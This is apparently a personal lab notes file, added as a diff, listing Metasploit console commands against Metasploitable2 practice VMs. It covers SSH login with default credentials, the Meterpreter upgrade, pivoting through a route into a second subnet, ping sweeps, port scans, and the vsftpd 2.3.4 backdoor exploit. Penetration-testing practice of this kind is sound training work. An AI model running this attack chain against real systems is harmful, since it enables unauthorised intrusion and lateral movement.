@@ -1,0 +1,57 @@
+KALI LINUX - BA (Bridge-adaptor) - 192.168.0.139
+
+metasploitable2(target1) - BA (Bridge-adaptor) - 192.168.0.137 (eth0) 
+metasploitable2(target1) - HA (Host-Only adaptor) - sudo dhclient - 192.168.205.103 (eth1)
+
+metasploitable2(target2 clone) - HA (Host-Only adaptor) - ip a - 192.168.204.104 (eth0)
+
+msfconsole
+search ssh type:auxiliary
+use auxiliary/scanner/ssh/ssh_login
+options
+set RHOSTS 192.168.0.137
+set USERNAME msfadmin
+set PASSWORD msfadmin
+options
+exploit
+NOTE: UPGRADE FROM SHELL TO METERPRETER 
+sessions
+sessions -h
+sessions -u 1
+
+sessions -i 2
+meterpreter>route  
+Note: MAKE NOTE OF N/W ID and subnet mask
+meterpreter>background
+
+route
+route add 192.168.205.0 255.255.255.0 2
+Note: route add <target2 n/w id> <subnet mask> <session id of meterpreter> 
+route
+
+search ping_sweep
+use post/multi/gather/ping_sweep
+options
+set RHOSTS 192.168.205.0/24 (target2 n/w id /24)
+set SESSION 2
+run
+
+search portscan
+use auxiliary/scanner/portscan/tcp
+options
+set RHOSTS 192.168.205.104  (target 2 )
+set PORTS 21,22,23,25,80
+run
+
+search ftp type:auxiliary
+use auxiliary/scanner/ftp/ftp_version
+options
+set RHOSTS 192.168.205.104 (target2 ip)
+run
+
+search vsftp
+use exploit/unix/ftp/vsftpd_234_backdoor
+options
+set RHOSTS 192.168.205.104 (target 2 ip)
+options
+exploit
